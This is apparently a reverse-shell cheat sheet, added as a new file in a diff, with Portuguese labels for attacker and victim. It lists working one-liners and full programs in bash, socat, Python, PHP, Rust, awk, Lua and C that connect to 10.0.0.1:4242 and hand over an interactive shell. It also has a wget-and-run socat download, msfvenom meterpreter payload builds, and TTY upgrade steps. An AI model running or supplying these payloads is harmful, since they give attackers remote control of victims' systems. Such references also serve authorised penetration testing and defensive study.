@@ -1,0 +1,90 @@
+                                               __         ____    
+   ________ _   _____  _____________     _____/ /_  ___  / / /____
+  / ___/ _ \ | / / _ \/ ___/ ___/ _ \   / ___/ __ \/ _ \/ / / ___/
+ / /  /  __/ |/ /  __/ /  (__  )  __/  (__  ) / / /  __/ / (__  ) 
+/_/   \___/|___/\___/_/  /____/\___/  /____/_/ /_/\___/_/_/____/  
+                                                                  
+																  
+[+] bash: /bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
+[+] socat:
+	atacante:
+		- socat file:`tty`,raw,echo=0 TCP-L:4242
+	
+	vitima:
+		- /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+		- wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+
+[+] python:
+	- python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+	- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+	
+[+] php:
+	- php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+	- php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+[+] rust:
+	use std::net::TcpStream;
+	use std::os::unix::io::{AsRawFd, FromRawFd};
+	use std::process::{Command, Stdio};
+
+	fn main() {
+		let s = TcpStream::connect("10.0.0.1:4242").unwrap();
+		let fd = s.as_raw_fd();
+		Command::new("/bin/sh")
+			.arg("-i")
+			.stdin(unsafe { Stdio::from_raw_fd(fd) })
+			.stdout(unsafe { Stdio::from_raw_fd(fd) })
+			.stderr(unsafe { Stdio::from_raw_fd(fd) })
+			.spawn()
+			.unwrap()
+			.wait()
+			.unwrap();
+	}
+	
+[+] awk: awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+[+] lua: lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+[+] C:
+	//compilar = gcc /tmp/shell.c --output csh && csh
+	
+	
+	#include <stdio.h>
+	#include <sys/socket.h>
+	#include <sys/types.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <netinet/in.h>
+	#include <arpa/inet.h>
+
+	int main(void) {
+		int port = 4242;
+		struct sockaddr_in revsockaddr;
+
+		int sockt = socket(AF_INET, SOCK_STREAM, 0);
+		revsockaddr.sin_family = AF_INET;       
+		revsockaddr.sin_port = htons(port);
+		revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+
+		connect(sockt, (struct sockaddr *) &revsockaddr, 
+		sizeof(revsockaddr));
+		dup2(sockt, 0);
+		dup2(sockt, 1);
+		dup2(sockt, 2);
+
+		char * const argv[] = {"/bin/sh", NULL};
+		execve("/bin/sh", argv, NULL);
+
+		return 0;       
+	}
+	
+[+] msfvenom:
+	- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
+	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
+	
+[+] extra = shell full tty:
+	- linux:
+		- python3 -c "import pty;pty.spawn('/bin/bash')"
+		- ctrl + z
+		- echo $TERM && tput lines && tput cols
+		- stty raw -echo
+		- fg
